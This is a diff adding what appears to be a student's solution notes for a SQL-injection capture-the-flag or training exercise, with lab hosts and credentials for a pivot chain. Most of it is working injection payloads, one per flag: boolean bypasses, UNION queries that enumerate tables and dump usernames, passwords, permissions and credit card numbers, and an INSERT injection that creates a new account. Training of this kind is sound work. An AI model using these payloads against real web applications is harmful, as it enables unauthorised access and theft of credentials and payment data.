@@ -1,0 +1,63 @@
+Scheme of Maneuver:
+>internet_grey_host: 10.50.28.45	student		e9YErLDvFlUWxX0
+->Pivot: 192.168.28.111			comrade		StudentWebExploitPassword
+-->T1:10.100.28.48
+
+Pivot
+Hostname: Donovian_Webserver
+IP: 192.168.28.111
+OS: Ubuntu 18.04
+Creds: comrade :: StudentWebExploitPassword
+Last Known SSH Port: 2222
+
+T1
+Hostname: donovian-nla
+IP: 10.100.28.48
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+Last Known HTTP Port: 80
+
+--------------------------------------------------------------------
+Flag 1: On the DNLA site identify the flag using the Categories page.
+(in the url)
+http://10.100.28.48/cases/productsCategory.php?category=1 or 1=1
+
+Flag 2: How many tables are able to be identified through Injection?
+(in the url)
+http://10.100.28.48/cases/productsCategory.php?category=1 UNION SELECT 2,table_name,4 from information_schema.tables where table_schema = 'sqlinjection' union select 5,6,7
+
+Flag 3: Provide the password for users with administrator access to the DNLA database.
+(in the url)
+http://10.100.28.48/cases/productsCategory.php?category=1 UNION SELECT 3,concat(username, ":", password, ":", permission),4 from members union all select 5,6,7
+
+Flag 4: Utilizing the Search page on DNLA, identify the flag.
+(in the search bar)
+word' or 1='1
+
+Flag 5: Identify the version of the database that Shenanigans is utilizing.
+(in the url)
+http://10.100.28.48/cases/productsCategory.php?category=1 union all select null, version(), null--
+
+Flag 6: Utilizing the input field on DNLA budget page, find the flag associated with credit cards.
+50) FROM categories UNION SELECT 1, 2, 3, creditcard_number FROM payments;# AND categories.id = category) AS maxamount FROM categories HAVING maxamount IS NOT NULL
+
+Flag 7: Find the flag associated with id 1337.
+(from the url)
+?category=1 UNION SELECT mime,data,id from sqlinjection.share4
+
+Flag 8:
+(from the username field)
+Hacker', 'pass', 'qwer@gmail.com', 1);#
+
+----------------------------------------------------------------------------------------------------
+///////////NOTES\\\\\\\\\\\\\\\\
+insert into members(firstname, lastname, username, password, email, permissions) values('bob', 'jones', 'Hacker', 'qwer@gmail.com', 1);#
+
+) ' " -- #
+
+SELECT id, name, description, (SELECT MAX(price) FROM products WHERE price <= 50 AND categories.id = category) AS maxamount FROM categories
+
+
+SELECT id, name, description, (SELECT MAX(price) FROM products WHERE price <= 50 ) FROM categories 
+
